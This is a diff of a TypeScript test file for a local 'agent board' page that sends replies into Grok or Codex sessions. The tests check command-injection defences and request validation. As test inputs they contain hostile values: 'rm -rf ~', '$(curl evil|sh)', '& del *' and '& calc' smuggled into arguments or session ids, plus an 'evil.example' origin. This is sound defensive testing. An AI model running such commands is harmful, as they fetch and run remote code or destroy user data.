@@ -3,7 +3,7 @@ import { expect, test } from 'claude-code/testing'
 import type { ProgressMirror, ProgressPr } from '../types'
 import { askOf } from '../hooks/ask'
 import { boardItems, boardKey, boardScreen, boardText, emptyBoardState, fit, peekInbox, pinned } from '../hooks/board'
-import { addManualTask, isArchivable, manualTaskCount, renderAutoBlock, setManualStep, takeArchivable, takeManualDone, takeTask, upsertAutoBlock } from '../hooks/blocks'
+import { addManualTask, isArchivable, manualTaskCount, mergeBlock, renderAutoBlock, setManualStep, takeArchivable, takeManualDone, takeTask, upsertAutoBlock } from '../hooks/blocks'
 import { agentHooks, boardCommands, boardScript, DELETE, isWindowsHost, openclawPlugin, openclawPrinted, openclawSavedBy, openclawTooOld, readConfig, reportCommand, reporterPs1, withFlatHook, withGroupedHook, withHermesHooks, withoutHermesHooks, withoutOurHooks, withoutSection } from '../hooks/connect'
 import { dashboardHtml } from '../hooks/dashboard'
 import { answerKey, blockId, isBoardTurn, isInboxFile, isTakenFile, isTextLog, isTranscriptPath, keepInboxDone, promptKey, readTurn, takenName, transcriptTail, turnsToDigest } from '../hooks/inbox'
@@ -13,10 +13,11 @@ import { appendJournal, countDay, journalLine, parseJournal, progressReport } fr
 import { applyTaskCreate, applyTaskUpdate, asData, cleanContext, cleanTitle, clip, completedSince, dataBlock, emptyMirror, noticesOf, resumeNote } from '../hooks/mirror'
 import { DARK, LIGHT, paletteFor } from '../hooks/palette'
 import { autoOf, parseProgress } from '../hooks/parse'
-import { LANGS, ZH_TW } from '../hooks/i18n'
+import { LANGS, RELAY, ZH_TW } from '../hooks/i18n'
 import { resolveLang, STRINGS } from '../hooks/strings'
 import { parseQuickAdd } from '../hooks/quick'
 import { keepRecent, remindersOf } from '../hooks/remind'
+import { pagePolicy, pageWords, replyText, requestProblem, sendKey, sendMode, sendPlan, serveAction, serveModel, servePage } from '../hooks/serve'
 import { buildView, contextOf, handoffOf, resumeCommand, statusLine } from '../hooks/view'
 
 const NOW = Date.parse('2026-10-16T12:00:00.000Z')
@@ -1142,12 +1143,16 @@ test('each agent gets a board command in the form it reads, and a missing report
   const files = Object.fromEntries(boardCommands(ctx).map(hook => [hook.file, hook]))
   const gemini = String(files['/h/.gemini/commands/board.toml']?.edit('', false))
   // A TOML literal string, so a Windows path's backslashes stay as they are.
-  expect(gemini).toContain(`prompt = '''${STRINGS.en.boardCommandPrompt}\n\n!{node "/h/.claude/agent-board.mjs"}\n'''`)
-  expect(String(files['/h/.config/opencode/commands/board.md']?.edit('', false))).toContain('!`node "/h/.claude/agent-board.mjs"`')
+  // Both print the board and then open its page, whose address is the last line.
+  expect(gemini).toContain(`prompt = '''${STRINGS.en.boardCommandPrompt}\n\n!{node "/h/.claude/agent-board.mjs" --serve}\n'''`)
+  expect(String(files['/h/.config/opencode/commands/board.md']?.edit('', false))).toContain('!`node "/h/.claude/agent-board.mjs" --serve`')
   const skill = String(files['/h/.agents/skills/agent-board/SKILL.md']?.edit('', false))
   // The description has a colon in it; quoted, it stays one YAML value.
   expect(skill.startsWith('---\nname: agent-board\ndescription: "Agent Board: what every agent is doing, and what waits on you"\n---\n')).toBe(true)
   expect(files['/h/.agents/skills/agent-board/SKILL.md']?.dirs).toContain('/h/.codex')
+  // Muse Code reads ~/.agents/skills too, so its config folder is enough to write the skill.
+  expect(files['/h/.agents/skills/agent-board/SKILL.md']?.dirs).toContain('/h/.config/muse')
+  expect(skill).toContain('node "/h/.claude/agent-board.mjs" --serve')
   expect(files['/h/.hermes/skills/agent-board/SKILL.md']?.edit('x', true)).toBe(DELETE)
   expect(files['/h/.gemini/config/skills/agent-board/SKILL.md']?.dir).toBe('/h/.gemini/antigravity')
   // Board files never count as connecting an agent: only its turns reaching the board do.
@@ -1155,6 +1160,222 @@ test('each agent gets a board command in the form it reads, and a missing report
   expect(boardCommands({ ...ctx, board: undefined })).toEqual([])
   expect(boardScript('/h/.claude/progress.md', 'en').split('\n')[0]).toBe('globalThis.AGENT_BOARD = {"path":"/h/.claude/progress.md","lang":"en"}')
   expect(reportCommand('/h/.claude/progress-report.sh', 'gemini', 'turn', false)).toBe("sh '/h/.claude/progress-report.sh' gemini turn || true")
+})
+
+const SERVE_FILE = `# Progress
+
+## api-gateway
+<!-- auto session=b2c3d4e5 agent=grok state=ended updated=2026-10-17T08:30:00Z resume=01a14a94-0dee-7543-8208-991a4266a1da dir=%2Fw%2Fapi-gateway -->
+### Pick the cache
+- [x] Measured both
+- [?] Redis or Memcached?
+<!-- /auto session=b2c3d4e5 -->
+
+<!-- auto session=a1b2c3d4 agent=codex state=waiting updated=2026-10-17T08:30:00Z resume=0199a2b3-c4d5-7e6f-8a9b-0c1d2e3f4a5b dir=%2Fw%2Fapi-gateway -->
+### Rate-limit the public endpoints
+- [x] Added the token bucket middleware
+- [?] Per-key limit — 100 or 300 a minute?
+<!-- /auto session=a1b2c3d4 -->
+
+## docs-site
+### Fix the broken links
+- [x] Find them
+- [?] Publish the site — OK?
+
+## acme-web
+<!-- auto session=9f8e7d6c state=working updated=2026-10-17T08:40:00Z -->
+### Dark mode for the settings page
+- [~] Settings page
+<!-- /auto session=9f8e7d6c -->
+`
+
+const SERVE_NOW = Date.parse('2026-10-17T08:45:00Z')
+const serveView = () => buildView(parseProgress(SERVE_FILE), [], null, SERVE_NOW, 0, {}, STRINGS.en)
+const GROK = { agent: 'grok', session: 'b2c3d4e5', resume: '01a14a94-0dee-7543-8208-991a4266a1da', dir: '/w/api-gateway', isClosed: true }
+
+test('the page offers a send only into a Grok or Codex session that has closed; an open one, Claude and a hand-kept task each get their own way', () => {
+  const model = serveModel(serveView(), [], STRINGS.en)
+  const row = (title: string) => model.groups.flatMap(group => group.rows).find(one => one.title === title)
+  expect(row('Pick the cache')).toMatchObject({ send: 'send', where: '/w/api-gateway', info: '', isSending: false })
+  const codex = model.asks.find(ask => ask.agent === 'codex')
+  expect(codex).toMatchObject({ send: 'open', info: STRINGS.en.serveSendOpen('codex'), where: '' })
+  expect(codex?.answers.length).toBeGreaterThan(0)
+  // A hand-kept question is the person's own: ticking it is the answer, with nothing to copy.
+  expect(model.asks.find(ask => ask.project === 'docs-site')).toMatchObject({ send: 'none', answers: [], canTick: true, info: '' })
+  expect(row('Dark mode for the settings page')?.send).toBe('claude')
+  // A reply on its way shows on its line until the agent answers.
+  const busy = serveModel(serveView(), [], STRINGS.en, new Set([sendKey(GROK)]))
+  expect(busy.groups.flatMap(group => group.rows).find(one => one.title === 'Pick the cache')?.isSending).toBe(true)
+  // Agents with no way in take a copied answer; a session with no folder or id has no way in.
+  expect(sendMode('gemini', { ...GROK, agent: 'gemini' })).toBe('none')
+  expect(sendMode('grok', { ...GROK, dir: null })).toBe('none')
+  // A block written before 0.19 has no id of the agent's own: nothing can be sent into it.
+  expect(sendMode('grok', { ...GROK, resume: null })).toBe('none')
+  expect(sendMode('grok', { ...GROK, isClosed: false })).toBe('open')
+  expect(sendMode('', null)).toBe('claude')
+})
+
+test('a send runs the agent with constants and a checked id only, and Codex on Windows takes the reply on stdin', () => {
+  expect(sendPlan(GROK, '--yolo; rm -rf ~', false)).toEqual({
+    agent: 'grok',
+    command: 'grok',
+    args: ['-r', '01a14a94-0dee-7543-8208-991a4266a1da', '--single=--yolo; rm -rf ~'],
+    stdin: null,
+    cwd: '/w/api-gateway',
+    isShell: false,
+  })
+  // Only by the session's own id, a UUID: `-c` would continue the newest session of the folder,
+  // and a name that is not a UUID can match another session's title.
+  expect(sendPlan({ ...GROK, resume: null }, 'yes', false)).toBe(null)
+  expect(sendPlan({ ...GROK, resume: '$(curl evil|sh)' }, 'yes', false)).toBe(null)
+  expect(sendPlan({ ...GROK, resume: 'fix-the-cache' }, 'yes', false)).toBe(null)
+  expect(sendPlan({ ...GROK, dir: null }, 'yes', false)).toBe(null)
+  const codex = { agent: 'codex', session: 'a1b2c3d4', resume: '0199a2b3-c4d5-7e6f-8a9b-0c1d2e3f4a5b', dir: '/w/api-gateway', isClosed: true }
+  expect(sendPlan(codex, 'use 300 & del *', true)).toEqual({
+    agent: 'codex',
+    command: 'codex',
+    args: ['exec', 'resume', '--skip-git-repo-check', '0199a2b3-c4d5-7e6f-8a9b-0c1d2e3f4a5b', '-'],
+    stdin: 'use 300 & del *',
+    cwd: '/w/api-gateway',
+    isShell: true,
+  })
+  // Codex only by its own id: its newest session could be another one.
+  expect(sendPlan({ ...codex, resume: null }, 'x', false)).toBe(null)
+  // Codex works in the folder it is started in: without the session's own, nothing is sent.
+  expect(sendPlan({ ...codex, dir: null }, 'x', false)).toBe(null)
+  expect(sendPlan({ ...codex, resume: '0199a2b3-c4d5-7e6f-8a9b-0c1d2e3f4a5b & calc' }, 'x', true)).toBe(null)
+  expect(sendPlan({ ...codex, agent: 'cursor' }, 'x', false)).toBe(null)
+})
+
+test('a press on the page is worked out from the file as it is now: a line that is gone is refused, and a reply goes with its question', () => {
+  const items = boardItems(serveView(), [])
+  const keyOf = (find: (item: (typeof items)[number]) => boolean) => items.find(find)?.key ?? ''
+  const grok = keyOf(item => item.type === 'row' && item.row.title === 'Pick the cache')
+  const sent = serveAction(items, { key: grok, type: 'send', text: '  Redis\u0007, it is already in the stack \r\n', session: 'b2c3d4e5' }, STRINGS.en)
+  // The task goes with it, so the page can say which of two sessions answered.
+  expect(sent).toEqual({ type: 'send', target: GROK, text: STRINGS.en.answerText('Redis or Memcached?', 'Redis, it is already in the stack'), title: 'Pick the cache' })
+  expect(serveAction(items, { key: grok, type: 'send', text: ' \u0000 ', session: 'b2c3d4e5' }, STRINGS.en)).toEqual({ type: 'refuse', note: '' })
+  // The line now belongs to another session than the one the page drew: refused, not sent there.
+  expect(serveAction(items, { key: grok, type: 'send', text: 'Redis', session: 'c0ffee12' }, STRINGS.en)).toEqual({ type: 'refuse', note: STRINGS.en.boardLineChanged })
+  expect(serveAction(items, { key: 'row:gone', type: 'tick', text: '', session: '' }, STRINGS.en)).toEqual({ type: 'refuse', note: STRINGS.en.boardLineChanged })
+  // An open Codex session is answered in its own window.
+  const codex = keyOf(item => item.type === 'ask' && item.ask.agent === 'codex')
+  expect(serveAction(items, { key: codex, type: 'send', text: '300', session: 'a1b2c3d4' }, STRINGS.en)).toEqual({ type: 'refuse', note: STRINGS.en.serveSendOpen('codex') })
+  const manual = keyOf(item => item.type === 'ask' && item.ask.project === 'docs-site')
+  expect(serveAction(items, { key: manual, type: 'tick', text: '', session: '' }, STRINGS.en).type).toBe('tick')
+  expect(serveAction(items, { key: manual, type: 'send', text: 'yes', session: '' }, STRINGS.en)).toEqual({ type: 'refuse', note: '' })
+  // An ended block can go to the archive; a working one cannot yet.
+  expect(serveAction(items, { key: grok, type: 'archive', text: '', session: '' }, STRINGS.en)).toMatchObject({ type: 'archive', title: 'Pick the cache' })
+  const working = keyOf(item => item.type === 'row' && item.row.title === 'Dark mode for the settings page')
+  expect(serveAction(items, { key: working, type: 'archive', text: '', session: '' }, STRINGS.en)).toEqual({ type: 'refuse', note: STRINGS.en.archiveGone })
+  expect(serveAction(items, { key: grok, type: 'delete', text: '', session: '' }, STRINGS.en)).toEqual({ type: 'refuse', note: '' })
+  expect(replyText('x'.repeat(5000)).length).toBe(4000)
+})
+
+test('the page server answers only its own host, with its token, and takes writes only as JSON from the page', () => {
+  const post = { method: 'POST', host: '127.0.0.1:5000', origin: 'http://127.0.0.1:5000', contentType: 'application/json', token: 'tok' }
+  expect(requestProblem(post, 5000, 'tok')).toBe(null)
+  expect(requestProblem({ ...post, host: 'LOCALHOST:5000', origin: '' }, 5000, 'tok')).toBe(null)
+  // A name rebound to 127.0.0.1 keeps its own name in Host.
+  expect(requestProblem({ ...post, host: 'rebind.example:5000' }, 5000, 'tok')).toBe(421)
+  expect(requestProblem({ ...post, host: '127.0.0.1:5001' }, 5000, 'tok')).toBe(421)
+  expect(requestProblem({ ...post, token: 'tak' }, 5000, 'tok')).toBe(403)
+  expect(requestProblem({ ...post, token: '' }, 5000, '')).toBe(403)
+  expect(requestProblem({ ...post, origin: 'https://evil.example' }, 5000, 'tok')).toBe(403)
+  expect(requestProblem({ ...post, contentType: 'text/plain' }, 5000, 'tok')).toBe(415)
+  expect(requestProblem({ ...post, method: 'PUT' }, 5000, 'tok')).toBe(405)
+  expect(requestProblem({ ...post, method: 'GET', contentType: '' }, 5000, 'tok')).toBe(null)
+})
+
+test("the page runs only its own script, and the chat prompt in it cannot close the script it sits in", () => {
+  const page = servePage(STRINGS.en, 'n0nce')
+  expect(page).toContain('<script nonce="n0nce">')
+  expect(pagePolicy('n0nce')).toContain("script-src 'nonce-n0nce'")
+  expect(pagePolicy('n0nce')).toContain("frame-ancestors 'none'")
+  expect(pagePolicy('n0nce')).toContain("connect-src 'self'")
+  // Words from the file are set as text by the page's script, never as HTML.
+  expect(page).not.toContain('innerHTML')
+  expect(page).not.toContain('insertAdjacentHTML')
+  // The relay prompt has a comment marker in it; inside the words it is escaped.
+  expect(page).not.toContain('<!-- auto')
+  expect(pageWords(STRINGS.en).relayPrompt).toBe(RELAY)
+  expect(Object.values(pageWords(STRINGS['zh-CN'])).every(word => typeof word === 'string' && word !== '')).toBe(true)
+})
+
+test('a block pasted from a web chat joins its project, then replaces its own earlier copy, with the time it was pasted', () => {
+  const pasted = (session: string, agent: string, body = '### Draft the launch post\n- [x] Outline\n- [?] Ship it Friday, OK?', project = '## launch') =>
+    `Here is the block:\n\n${project}\n<!-- auto session=${session} agent=${agent} state=waiting updated=2020-01-01T00:00:00Z -->\n${body}\n<!-- /auto session=${session} -->\n`
+  const now = Date.parse('2026-10-17T09:00:00Z')
+  const added = mergeBlock(SERVE_FILE, pasted('c0ffee12', 'muse'), now, STRINGS.en)
+  expect('title' in added ? added.title : added.problem).toBe('Draft the launch post')
+  const text = 'text' in added ? added.text : ''
+  expect(text).toContain('## launch\n\n<!-- auto session=c0ffee12 agent=muse state=waiting updated=2026-10-17T09:00:00Z -->')
+  expect(parseProgress(text).find(project => project.name === 'launch')?.tasks[0]?.auto).toMatchObject({ agent: 'muse', state: 'waiting' })
+  const again = mergeBlock(text, pasted('c0ffee12', 'muse', '### Draft the launch post\n- [x] Outline\n- [x] Ship it Friday, OK?'), now + 60_000, STRINGS.en)
+  const merged = 'text' in again ? again.text : ''
+  expect(merged.split('session=c0ffee12 agent=muse').length).toBe(2)
+  expect(merged).toContain('- [x] Ship it Friday, OK?')
+  expect(merged).toContain('updated=2026-10-17T09:01:00Z')
+  // A project the file has already takes it under its heading, before the next project.
+  const under = mergeBlock(SERVE_FILE, pasted('d00dfeed', 'dot', '### Cache keys\n- [ ] Name them', '## api-gateway'), now, STRINGS.en)
+  const placed = 'text' in under ? under.text : ''
+  expect(placed.indexOf('session=d00dfeed')).toBeGreaterThan(placed.indexOf('## api-gateway'))
+  expect(placed.indexOf('session=d00dfeed')).toBeLessThan(placed.indexOf('## docs-site'))
+  // The marker is written again from what was checked: a chat cannot pick the session or the
+  // folder a reply from the page goes to.
+  const posing = pasted('d00dfeed', 'grok').replace(' updated=2020-01-01T00:00:00Z', ' updated=2020-01-01T00:00:00Z resume=01a14a94-0dee-7543-8208-991a4266a1da dir=%2Fw%2Fevil pr=7').replace('state=waiting', 'state=ended')
+  const posed = mergeBlock(SERVE_FILE, posing, now, STRINGS.en)
+  const posedText = 'text' in posed ? posed.text : ''
+  expect(posedText).toContain('<!-- auto session=d00dfeed agent=grok state=ended updated=2026-10-17T09:00:00Z -->')
+  expect(posedText).not.toContain('dir=%2Fw%2Fevil')
+  const posedRow = serveModel(buildView(parseProgress(posedText), [], null, now, 0, {}, STRINGS.en), [], STRINGS.en).groups.flatMap(group => group.rows).find(row => row.title === 'Draft the launch post')
+  expect(posedRow?.send).toBe('none')
+  // A marker with no time gets one.
+  const bare = pasted('c0ffee12', 'muse').replace(' updated=2020-01-01T00:00:00Z', '')
+  expect('text' in mergeBlock(SERVE_FILE, bare, now, STRINGS.en) ? 'merged' : 'refused').toBe('merged')
+})
+
+test('a pasted block never takes the place of Claude’s, another agent’s or an unclosed block, and one that would hide its own end is refused', () => {
+  const pasted = (session: string, agent: string, body = '### Draft the launch post\n- [ ] Outline') =>
+    `## launch\n<!-- auto session=${session} agent=${agent} state=working updated=2026-10-17T08:00:00Z -->\n${body}\n<!-- /auto session=${session} -->`
+  const problem = (text: string, block: string) => {
+    const result = mergeBlock(text, block, SERVE_NOW, STRINGS.en)
+    return 'problem' in result ? result.problem : 'merged'
+  }
+  expect(problem(SERVE_FILE, pasted('9f8e7d6c', 'muse'))).toBe('notYours')
+  expect(problem(SERVE_FILE, pasted('b2c3d4e5', 'dot'))).toBe('notYours')
+  const unclosed = '## launch\n<!-- auto session=c0ffee12 agent=muse state=working updated=2026-10-17T08:00:00Z -->\n### Draft\n- [ ] Outline\n'
+  expect(problem(unclosed, pasted('c0ffee12', 'muse'))).toBe('notYours')
+  expect(problem(SERVE_FILE, pasted('c0ffee12', 'claude'))).toBe('badBlock')
+  expect(problem(SERVE_FILE, pasted('c0ffee12', 'muse').replace(' agent=muse', ''))).toBe('badBlock')
+  expect(problem(SERVE_FILE, pasted('C0FFEE12', 'muse'))).toBe('badBlock')
+  expect(problem(SERVE_FILE, pasted('c0ffee12', 'muse', '- [ ] No title first'))).toBe('badBlock')
+  for (const line of ['```', '~~~', '- [ ] a <!-- note -->', '- [ ] a -->', '## another', '# Progress']) {
+    expect(problem(SERVE_FILE, pasted('c0ffee12', 'muse', `### Draft\n${line}\n- [ ] b`))).toBe('badBlock')
+  }
+  // A comment opened in the title would hide the steps and the end marker.
+  expect(problem(SERVE_FILE, pasted('c0ffee12', 'muse', '### Plan <!--\n- [ ] b'))).toBe('badBlock')
+  expect(problem(SERVE_FILE, 'Sorry, I cannot write that.')).toBe('noBlock')
+  expect(problem(SERVE_FILE, pasted('c0ffee12', 'muse').replace('<!-- /auto session=c0ffee12 -->', ''))).toBe('noBlock')
+  expect(problem(SERVE_FILE, pasted('c0ffee12', 'muse').replace('/auto session=c0ffee12', '/auto session=abcdef12'))).toBe('mixed')
+  expect(problem(SERVE_FILE, pasted('c0ffee12', 'muse').replace('## launch\n', ''))).toBe('noProject')
+})
+
+test("an agent's block keeps that agent's own session id as resume=, so the page can answer into it", () => {
+  const mirror = { ...emptyMirror('k1', 'api-gateway', NOW, '/w/api-gateway'), title: 'Pick the cache', state: 'ended' as const, resume: '01a14a94-0dee-7543-8208-991a4266a1da' }
+  const text = upsertAutoBlock('', mirror)
+  expect(text).toContain('resume=01a14a94-0dee-7543-8208-991a4266a1da')
+  expect(parseProgress(text)[0]?.tasks[0]?.auto?.resume).toBe('01a14a94-0dee-7543-8208-991a4266a1da')
+  // An id that could carry a command is left out.
+  expect(upsertAutoBlock('', { ...mirror, resume: '$(curl evil|sh)' })).not.toContain('resume=$(')
+})
+
+test('a reply that ends with the board page’s address is still only a look at the board', () => {
+  const said = (prompt: string, answer: string) => readTurn('grok-turn-1-1.json', JSON.stringify({ session_id: 's', cwd: '/w/app', prompt, last_assistant_message: answer }))
+  const board = 'Progress  ● 2 waiting  ▸ 5 in progress  ⚑ 0 due soon  ✓ 1 done today\n\n● Waiting on you\n  api-gateway › Rate limits\n    [Choose] 100 or 300 a minute?\n'
+  const link = STRINGS.en.serveAt('http://127.0.0.1:53121/?t=Ab3_-xYz09')
+  expect(isBoardTurn(said('where do things stand?', `${board}\n${link}\nThe rate limit question needs you first.`)!)).toBe(true)
+  expect(isBoardTurn(said('where do things stand?', `\`\`\`\n${board}\`\`\`\n\n${link}`)!)).toBe(true)
 })
 
 test('a Codex turn that showed the board is known by its session log, since its Stop leaves the request out', () => {
